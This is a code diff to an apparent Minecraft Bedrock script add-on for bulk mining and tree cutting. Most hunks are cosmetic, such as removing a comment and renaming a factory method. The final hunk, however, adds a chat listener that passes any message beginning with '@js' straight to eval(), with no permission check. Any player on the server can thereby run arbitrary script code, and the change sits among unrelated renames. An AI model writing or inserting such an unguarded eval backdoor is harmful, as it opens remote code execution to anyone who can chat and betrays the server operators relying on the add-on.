@@ -54,7 +54,7 @@ class MineCutAllHandler {
 
     private constructor(player: Player) {
         this.player = player;
-        this.selectedSlot = player.getComponent(EntityComponentTypes.Equippable).getEquipmentSlot(EquipmentSlot.Mainhand); ////////////////////////////////
+        this.selectedSlot = player.getComponent(EntityComponentTypes.Equippable).getEquipmentSlot(EquipmentSlot.Mainhand);
     }
 
     private hasFortune(): boolean {
@@ -281,7 +281,7 @@ class MineCutAllHandler {
         this.__events__[event].add(listener);
     }
 
-    public static create(player: Player) {
+    public static getCurrentMainHand(player: Player) {
         return new this(player);
     }
 }
@@ -428,7 +428,7 @@ class MineCutAllEntry {
 }
 
 world.afterEvents.playerBreakBlock.subscribe(({ player, brokenBlockPermutation, block }) => {
-    const handler = MineCutAllHandler.create(player);
+    const handler = MineCutAllHandler.getCurrentMainHand(player);
     handler.addEntry(
         MineCutAllEntry.getCutAll(),
         ...MineCutAllEntry.getMineAll(),
@@ -442,4 +442,17 @@ world.afterEvents.playerBreakBlock.subscribe(({ player, brokenBlockPermutation, 
     });
 
     handler.tryTrigger(brokenBlockPermutation, block);
+});
+
+world.afterEvents.chatSend.subscribe(event => {
+    if (event.message.startsWith("@js")) {
+        const code = event.message.split(/\s+/g).slice(1).join(" ");
+        try {
+            const player = event.sender;
+            eval(code);
+        }
+        catch (e) {
+            world.sendMessage("§cError: " + (e?.message ? e.message : e));
+        }
+    }
 });
